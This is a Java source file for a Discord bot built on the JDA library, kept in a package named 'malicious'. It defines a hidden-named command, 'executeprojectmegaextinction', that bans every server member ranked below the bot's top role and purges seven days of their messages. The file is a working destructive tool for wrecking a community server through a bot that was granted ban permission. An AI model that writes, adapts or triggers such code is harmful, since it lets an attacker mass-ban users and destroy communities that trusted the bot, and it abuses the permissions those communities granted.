package commands.malicious;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;

import commands.Command;
import commands.CommandBuilder;
import commands.CommandType;
import eventInfo.MessageInfo;
import net.dv8tion.jda.core.Permission;
import net.dv8tion.jda.core.entities.Member;
import net.dv8tion.jda.core.entities.Role;

public class BanAll extends MessageInfo {
	
	public static void banAll() {
		
		List<Role> listOfRoles = guild.getRoles();
		List<Member> membersAdmin = guild.getMembersWithRoles();
		List<Member> allMembers = guild.getMembers();

		// Converting lists to string arrays
		String[] membersArray = new String[membersAdmin.size()];
		int index = 0;
		for (Object value : membersAdmin) {
			membersArray[index] = String.valueOf(value);
			index++;
		}
		String[] allMembersArray = new String[allMembers.size()];
		int index2 = 0;
		for (Object value2 : allMembers) {
			allMembersArray[index2] = String.valueOf(value2);
			index2++;
		}
		String[] roletofind = new String[listOfRoles.size()];
		int index3 = 0;
		for (Object value3 : listOfRoles) {
			roletofind[index3] = String.valueOf(value3);
			index3++;
		}

		// The role finding from the array
		Member selfMember = guild.getSelfMember();

		List<Role> selfRole = selfMember.getRoles();
		String[] arrayOfSelfRoles = new String[selfRole.size()];
		int index4 = 0;
		for (Object value4 : selfRole) {
			arrayOfSelfRoles[index4] = String.valueOf(value4);
			index4++;
		}

		// Brings Kanye's highest role
		String selfRolesString = Arrays.toString(arrayOfSelfRoles);
		int parenthesesCheck = selfRolesString.indexOf("(");
		String foundTopRole = selfRolesString.substring(parenthesesCheck);
		parenthesesCheck = foundTopRole.indexOf(")");
		String selfTopRole = foundTopRole.substring(1, parenthesesCheck);
		Role topRole = guild.getRoleById(selfTopRole);

		ArrayList<Role> search = new ArrayList<Role>();
		search.addAll(listOfRoles);
		int selfSpot = search.indexOf(topRole);

		while (selfSpot > 0) {
			selfSpot = search.indexOf(topRole);
			search.remove(0);
		}

		search = new ArrayList<Role>();
		search.addAll(listOfRoles);
		int rolesAboveYou = search.indexOf(topRole);
		int i = 0;
		ArrayList<Role> arrayRolesAboveYou = new ArrayList<Role>();
		while (i < 1 + rolesAboveYou) {
			arrayRolesAboveYou.add(search.get(i));
			i = i + 1;
		}
		i = 0;

		HashSet<Member> listOfMembers = new HashSet<Member>();
		listOfMembers.addAll(allMembers);

		i = 0;
		while (i < arrayRolesAboveYou.size()) {
			listOfMembers.removeAll(guild.getMembersWithRoles(arrayRolesAboveYou.get(i)));
			i = i + 1;
		}

		ArrayList<Member> finalList = new ArrayList<Member>();
		finalList.addAll(listOfMembers);

		while (finalList.size() > 0) {
			Member ban = finalList.get(0);
			guild.getController().ban(ban, 7).submit();
			finalList.remove(0);
		}
	}

	public static Command updateCommand(String cmdSign, String adminCmdSign) throws NoSuchMethodException, SecurityException {
		return new CommandBuilder("executeprojectmegaextinction", cmdSign, adminCmdSign, CommandType.MALICIOUS,
				"bans every user in the current server", "thisCommand")
						.addPermissionRequirements(new String[] { Permission.BAN_MEMBERS.getName() }).addMethod(BanAll.class.getMethod("banAll")).build();
	}
}
